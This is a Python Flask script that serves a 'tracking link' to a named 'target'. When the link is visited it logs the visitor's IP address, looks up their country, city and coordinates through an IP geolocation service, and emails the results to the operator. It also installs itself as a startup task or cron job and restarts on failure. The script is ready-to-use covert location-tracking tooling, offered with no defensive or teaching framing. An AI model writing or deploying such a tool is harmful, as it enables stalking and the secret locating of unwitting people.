import os
import platform
import requests
import smtplib
import subprocess
from time import sleep
from flask import Flask, request
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

# Email configuration
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your_email_password"  # Replace with your email password
RECEIVER_EMAIL = "receiver_email@gmail.com"  # Replace with your recipient email

# Tracking link configuration
TRACKING_URL = "http://your_public_server_url.com"  # Replace with your actual public server URL

def send_email(ip_address, location_info):
    """Sends an email with the captured IP and location information."""
    subject = "Device Location Accessed"
    body = f"""
    Device accessed the tracking link:
    
    IP Address: {ip_address}
    Country: {location_info.get('country', 'N/A')}
    Region: {location_info.get('region', 'N/A')}
    City: {location_info.get('city', 'N/A')}
    Latitude: {location_info.get('lat', 'N/A')}
    Longitude: {location_info.get('lon', 'N/A')}
    """

    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Email sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.route('/')
def capture_info():
    ip_address = request.remote_addr
    geo_response = requests.get(f"http://ip-api.com/json/{ip_address}")
    geo_data = geo_response.json()

    location_info = {
        'ip': ip_address,
        'country': geo_data.get('country', 'N/A'),
        'region': geo_data.get('regionName', 'N/A'),
        'city': geo_data.get('city', 'N/A'),
        'lat': geo_data.get('lat', 'N/A'),
        'lon': geo_data.get('lon', 'N/A')
    }

    print(f"Captured data: {location_info}")
    send_email(ip_address, location_info)

    return "Thank you for visiting!", 200

def generate_tracking_link():
    print(f"Send this link to the target: {TRACKING_URL}")

def schedule_task():
    """Configures the program to run persistently on system startup."""
    system = platform.system()
    if system == "Windows":
        # Windows: Configure Task Scheduler to restart the program on startup
        task_name = "PersistentFlaskApp"
        subprocess.run([
            "schtasks", "/create", "/tn", task_name, "/tr", f'python "{os.path.abspath(__file__)}"', "/sc", "onlogon"
        ])
        print("Scheduled task created to run on Windows startup.")
    elif system == "Linux" or system == "Darwin":
        # Linux/Mac: Configure a cron job to restart the program on reboot
        cron_job = f"@reboot python3 {os.path.abspath(__file__)} &\n"
        with open("/tmp/temp_cron", "w") as f:
            f.write(cron_job)
        subprocess.run("crontab /tmp/temp_cron", shell=True)
        os.remove("/tmp/temp_cron")
        print("Cron job created to run on system startup.")

def start_server_with_retries():
    """Starts the Flask server with automatic retries on failure."""
    while True:
        try:
            app.run(host="0.0.0.0", port=5000)
        except Exception as e:
            print(f"Server error: {e}. Restarting server in 5 seconds...")
            sleep(5)

if __name__ == '__main__':
    generate_tracking_link()
    schedule_task()  # Set up the application to run on system startup
    start_server_with_retries()  # Start the server with retry on failure
